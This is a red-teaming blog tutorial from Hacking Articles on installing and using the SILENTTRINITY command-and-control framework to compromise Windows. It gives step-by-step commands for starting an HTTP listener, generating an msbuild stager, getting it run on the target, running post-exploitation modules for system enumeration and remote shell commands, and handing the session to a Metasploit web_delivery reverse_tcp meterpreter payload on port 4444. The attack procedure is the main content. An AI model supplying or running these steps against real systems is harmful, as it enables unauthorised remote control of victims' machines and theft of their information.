<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/" rel="category tag">Command and Control</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Command &amp; Control: Silenttrinity Post-Exploitation Agent</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/command-control-silenttrinity-post-exploitation-agent/" rel="bookmark"><time class="entry-date published" datetime="2019-03-21T14:01:11+00:00">March 21, 2019</time><time class="updated" datetime="2025-05-13T09:51:10+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn to use Silent Trinity tool to exploit windows.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction</span></li>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Windows exploitation</span></li>
<li><span style="color: #000000;">Windows post exploitation</span></li>
<li><span style="color: #000000;">Silent trinity to meterpreter</span></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">Silent trinity is a command and control tool dedicated to windows. It is developed by byt3bl33d3r in python, iron python, C# and .net. as it is windows dedicated tool, C# was but obvious choice as it has a direct access .NET framework just like PowerShell. Its an amazing post exploitation tool for windows. This tool supports C2 server over HTTP 1.1.</span></p>
<h3><span style="color: #800000;">Installation</span></h3>
<p><span style="color: #000000;">Installing silent trinity is pretty easy as you just have to download it using git clone and then install its dependencies using pip command.  To download silent trinity, use the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone //github.com/byt3bl33d3r/SILENTTRINITY</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Zg879nwgzTU/XJOVrj1oCCI/AAAAAAAAdpE/kY_2iLT84P8xMipnRxwqISYiSzs1m2IugCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now to install all the requirements using the following commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip install -r requirements.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-hbLZTPNyfl4/XJOVuCv_e2I/AAAAAAAAdpo/SPICqtQKZbIS_2VFTNlxou3-zCs24e1JQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Once the installation is complete, start the said tool as shown in the image below :</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-mUwBXBGkyYI/XJOVuZIUeVI/AAAAAAAAdps/D2wcU4w1eh46UwCiv0RRJx5QMt7WGrFLACLcBGAs/s1600/3.png" alt="SilentTrinity Post Exploitation Agent" width="866" height="986"/></span></p>
<h3><span style="color: #800000;">Windows Exploitation</span></h3>
<p><span style="color: #000000;">As the tool is up and running, use ‘list’ command to see the list of listeners available. As you can see in the image below only listeners are available i.e. http, and https. To start the listener, use the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use http
start</pre>
<p><span style="color: #000000;">When starting the listener, there is no need to give IP address or port as it automatically takes the IP of the local machine and the port is always pre-defined, depending on the listener, such as port 80 is specified for the listener http and port 443 is specified for the listener https. Now, as you can see that in the image below, with the help of the above commands our listener has started :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Siq1Ry9tOnY/XJOVuhscqJI/AAAAAAAAdpw/-zc_oY1Qhx0_imRYf5R0G5oBdmerY7Y_gCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As we have done with the listeners, now comes the stagers. Similar to the listener, use the <strong>‘list’</strong> command to see the list of all the available listeners. Because this tool is a windows dedicated tool, there are only three stagers in relation to windows and they are msbuild, wmic, PowerShell. To launch the stager use the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use msbuild
generate http</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-iCnaIyibh50/XJOVu5o2R4I/AAAAAAAAdp0/zpcD_eXLzBYJWYnb-LIgwsWeiBqd67IzwCLcBGAs/s1600/5.png"/></strong></span></p>
<p><span style="color: #000000;">Executing the above commands will create a file. Share that file to the target system using the python server as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-Jdd90tk_u38/XJOVvAMyZkI/AAAAAAAAdp4/mEwFqyeHoL8LSkINSjexo9MZ22d_mfnzACLcBGAs/s1600/6.png" alt="SilentTrinity Post Exploitation Agent" width="775" height="107"/></span></p>
<p><span style="color: #000000;">And now, run the file in the command prompt of the target system with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuiild.xml</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-4eeDsKFZGXE/XJOVvaya6-I/AAAAAAAAdp8/fLFEWbdhp2kQuf03dSPA8mXBPRjxzw77ACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">As the file is executed, you can see in the image below, a session will be generated.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-xFf6Oq6xC7I/XJOVvvmSBHI/AAAAAAAAdqA/SaMaX2g4mYg8SuH3hTiqVv5NtWBh7MZdwCLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;">Windows Post Exploitation</span></h3>
<p><span style="color: #000000;">As the session is generated, you can again use the <strong>‘list’</strong> command to see the list of post exploitation modules available, some of which we will show in our article, as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-8FeOu3t9jvQ/XJOVv--Zr2I/AAAAAAAAdqE/vb8IwQJOpxUNXVDYezk4cB98xEXB1IplgCLcBGAs/s1600/9.png" alt="SilentTrinity Post Exploitation Agent" width="1171" height="844"/></span></p>
<p><span style="color: #000000;">Let’s try and use the message box. The purpose of this exploit is to pop a message on the victim’s PC. To use this exploit run the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use ipy/msgbox
set Text "Hacking Articles"
set Title "Hack"
run &lt;session name&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Y4klA1Asrac/XJOVrpixR5I/AAAAAAAAdpM/pDBjCwY16VsEFGHDBBn7yWRtYpjfdxMZgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">And as the result of the said exploit, a message box will pop up on the target machine. You can see the message box in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Nv4sV3776DE/XJOVrqcy93I/AAAAAAAAdpI/tS9xCGcgabYOSek4tHHM1-y8DGk7YICwACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">The next exploit is to receive basic information about the target system. And for his, type the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use ipy/systeminfo
run &lt;session name&gt;</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/--t2zQJS8VGw/XJOVsfx2Q1I/AAAAAAAAdpQ/Pk2M_rn7GFcyxdvNSt1NTZaONRLur5MngCLcBGAs/s1600/12.png" alt="SilentTrinity Post Exploitation Agent" width="684" height="249"/></span></p>
<p><span style="color: #000000;">There is a module for enumeration of host and to run that module type the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use ipy/hostenum
run &lt;session name&gt;</pre>
<p><span style="color: #000000;">As you can see you have catalogues and detailed information about your target system in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-jzyjLrHHlJw/XJOVso09a9I/AAAAAAAAdpU/wwUr8L5oK6UJ_EfU9QDcAMiRkklgMQa0gCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">With the next exploit, you can access shell of the target system but command by command and for this type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use ipy/shell
set Command ipconfig
run &lt;session name&gt;</pre>
<p><span style="color: #000000;">As shown in the image below, it runs the ipconfig command through the session that has access to.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-bJIf6UshFT4/XJOVs7oqn-I/AAAAAAAAdpY/jfZmp0BGrpcw9uL8oGSjWOJYS8E3agw0ACLcBGAs/s1600/14.png" alt="SilentTrinity Post Exploitation Agent" width="1002" height="941"/></span></p>
<h3><span style="color: #800000;">Silent trinity to meterpreter</span></h3>
<p><span style="color: #000000;">To have a meterpreter session via silent trinity start Metasploit by using msfconsole command in a new terminal. And use the web_delivery exploit using the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set lhost eth0
set lport 4444
run</pre>
<p><span style="color: #000000;">Running the above commands will generate a command that is to be run in the target system as shown in the image below :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-1TJ6fjtMQ4o/XJOVtOy3yNI/AAAAAAAAdpc/EEpWF87yQbUGYwqDVoHlC2B4pi5VvB64ACLcBGAs/s1600/15.png" alt="SilentTrinity Post Exploitation Agent" width="922" height="343"/></span></p>
<p><span style="color: #000000;">The above-generated command is to be run in the shell of the victim’s PC and for that execute the command in the shell by using silent trinity as we had run ipconfig command earlier. </span></p>
<p><span style="color: #000000;">run &lt;session name&gt;</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-swXdPxo1g3w/XJOVteAv6yI/AAAAAAAAdpg/xIpunH3mjNMwGdv_bb9CXL-cw4yr3a6rACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">As the command will run in the silent trinity, you will have your meterpreter session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-7o6EvQCYPmw/XJOVts1wTZI/AAAAAAAAdpk/2-hnUDOEX3E5PieXUvFtUAnFsBOdor5SwCLcBGAs/s1600/17.png" alt="SilentTrinity Post Exploitation Agent" width="920" height="519"/></span></p>
<p><span style="color: #000000;">So, all in all, Silent trinity is an amazing tool when it comes to exploiting windows.</span></p>
<p><span style="color: #000000;">To learn more about <strong>Command and Control</strong>. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/command-and-control/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast<strong>. </strong>Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
